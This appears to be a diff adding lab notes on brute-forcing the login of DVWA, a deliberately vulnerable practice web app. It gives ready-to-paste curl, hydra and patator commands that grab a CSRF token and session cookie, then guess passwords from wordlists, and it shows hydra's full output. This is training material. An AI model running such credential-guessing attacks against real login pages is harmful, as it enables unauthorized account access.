@@ -1,3 +1,23 @@
+Source - G0tmi1k
+
+Quick copy/paste
+
+CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+
+hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/500-worst-passwords.txt \
+  -e ns  -F  -u  -t 1  -w 10  -V  192.168.1.44  http-post-form \
+  "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"
+
+patator  http_fuzz  method=POST  follow=0  accept_cookie=0 --threads=1  timeout=10 \
+  url="http://192.168.1.44/DVWA/login.php" \
+  1=/usr/share/seclists/Usernames/top_shortlist.txt  0=/usr/share/seclists/Passwords/500-worst-passwords.txt \
+  body="username=FILE1&password=FILE0&user_token=${CSRF}&Login=Login" \
+  header="Cookie: security=impossible; PHPSESSID=${SESSIONID}" \
+  -x quit:fgrep=index.php
+
+
+
 Main Page Brute Forcing
 -----------------------
 
@@ -5,4 +25,48 @@ Main Page Brute Forcing
 Information Gathering
 Login Form (Apache Redirect)
 curl 192.168.1.33/DVWA
+
+Login Form (DVVA Redirect)
+[root:~]# curl -i 192.168.1.33/DVWA/
+HTTP/1.1 302 Found
+Date: Thu, 15 Oct 2015 19:54:18 GMT
+Server: Apache/2.4.10 (Win32) OpenSSL/1.0.1h PHP/5.4.31
+X-Powered-By: PHP/5.4.31
+Set-Cookie: PHPSESSID=t9eeaf7e8usuiu08jl9e092ro7; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Set-Cookie: PHPSESSID=t9eeaf7e8usuiu08jl9e092ro7; path=/; httponly
+Set-Cookie: security=impossible; httponly
+Location: login.php
+Content-Length: 0
+Content-Type: text/html
+
+
+Hydra (Test/Debug Command)
+
+[root:~]# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
+[root:~]# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
+[root:~]#
+[root:~]# export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
+[root:~]# rm -f hydra.restore
+[root:~]#
+[root:~]# hydra -l admin -p password -e ns -u -F -t 1 -w 10 -W 1 -v -V 192.168.1.33 http-post-form "/DVWA/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:F=Location\: login.php:C=/404.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"
+Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (http://www.thc.org/thc-hydra) starting at 2015-10-15 21:05:13
+[INFO] Using HTTP Proxy: http://127.0.0.1:8080
+[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
+[DATA] max 1 task per 1 server, overall 64 tasks, 3 login tries (l:1/p:3), ~0 tries per task
+[DATA] attacking service http-post-form on port 80
+[VERBOSE] Resolving addresses ... done
+[ATTEMPT] target 192.168.1.33 - login "admin" - pass "admin" - 1 of 3 [child 0]
+[ATTEMPT] target 192.168.1.33 - login "admin" - pass "" - 2 of 3 [child 0]
+[ATTEMPT] target 192.168.1.33 - login "admin" - pass "password" - 3 of 3 [child 0]
+[VERBOSE] Page redirected to http://192.168.1.33/DVWA/index.php
+[STATUS] attack finished for 192.168.1.33 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid passwords found
+Hydra (http://www.thc.org/thc-hydra) finished at 2015-10-15 21:05:29
+
+
 
